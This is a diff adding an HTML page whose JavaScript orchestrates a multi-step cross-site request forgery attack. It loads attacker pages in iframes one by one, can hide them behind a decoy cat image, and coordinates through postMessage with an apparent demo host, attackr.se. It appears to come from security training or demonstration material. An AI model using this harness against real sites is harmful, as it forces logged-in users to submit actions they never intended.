@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="../../../js/jquery-1.7.2.min.js"></script>
+    <script>
+        var CSRF = function(){
+            var hideIFrames = false,
+                    frames =
+                            [
+                                {id: 0, hasPosted: "no", hasOpenedIFrame: false, src: 'csrfMulti0.html'}
+                               ,{id: 1, hasPosted: "no", hasOpenedIFrame: false, src: 'csrfMulti1.html'}
+//                               ,{id: 2, hasPosted: "no", hasOpenedIFrame: false, src: 'csrfMulti2.html'}
+                    ],
+                    appendIFrame = function(frame) {
+                        var domNode = '<iframe src="' + frame.src + '" height="600" width="400"' + (hideIFrames ? 'style="visibility: hidden"' : '') + '></iframe>';
+                        $("body").append(domNode);
+                    };
+
+            return {
+
+                checkIFrames : function() {
+                    var frame;
+                    for (var i = 0; i < frames.length; i++) {
+                        frame = frames[i];
+                        if (!frame.hasOpenedIFrame) {
+                            appendIFrame(frame);
+                            frame.hasOpenedIFrame = true;
+                            break;  // Only open one iframe at the time
+                        } else if(frame.hasPosted == "no") {
+                            frame.hasPosted = "maybe";
+                            break;  // iframe not done posting, wait
+                        } else if(frame.hasPosted == "maybe") {
+                            frame.hasPosted = "yes";
+                            console.log("iframe " + frame.id + " done");
+                            break;  // iframe not done posting, wait
+                        } else if (frame.hasPosted == "yes") {
+                            continue;  // Time to allow for the next iframe to open
+                        }
+                    }
+                },
+
+                receiveMessage : function(event) {
+                    if (event.origin == "https://attackr.se:8444") {
+                        console.log("iframe still not done posting: " + event.data);
+                        CSRF.frames[parseInt(event.data)].hasPosted = "no";  // Still on CSRF page so POST not done yet
+                    }
+                },
+
+                onLoad : function() {
+                    // Parent page checks status every two seconds
+                    // Child iframes should send a message every second until they've got their response
+                    setInterval(CSRF.checkIFrames, 2000);
+                },
+
+                frames: frames,
+                hideIframes: hideIFrames
+            }
+        }();
+
+        addEventListener("message", CSRF.receiveMessage, false);
+
+        // Catching security errors for illegal access to iframe's location.pathname possible in Firefox but not WebKit
+        //                    try {
+        //                        // As long as we have access to this property were still on our own domain,
+        //                        // i.e. the iFrame has not posted yet
+        //                        window.frames[frame.id].location.pathname;
+        //                    } catch (error) {
+        //                        frame.hasPosted = true;
+        //                        console.log("Post " + frame.id + " done");
+        //                    }
+    </script>
+</head>
+<body onload="CSRF.onLoad()">
+<script>
+    if(CSRF && CSRF.hideIframes) {
+        $(body).append('<img src="../../i-can-has-cheezburger.jpg" alt="http://icanhascheezburger.com/2007/01/11/i-can-has-cheezburger-3/"/>');
+    }
+</script>
+</body>
+</html>
